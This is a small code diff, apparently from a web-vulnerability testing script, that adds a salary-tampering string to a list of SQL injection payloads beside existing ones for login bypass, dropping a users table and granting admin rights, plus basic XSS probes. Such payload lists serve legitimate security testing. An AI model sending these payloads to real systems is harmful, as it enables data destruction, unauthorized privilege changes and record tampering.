@@ -9,7 +9,8 @@ init(autoreset=True)
 
 sql_payloads = [
     "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --",
-    "abc'; UPDATE users SET role='admin' WHERE username='victim'; --"
+    "abc'; UPDATE users SET role='admin' WHERE username='victim'; --",
+    "x', salary='1' WHERE name='Boby'#"
 ]
 xss_payloads = [
     "<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"
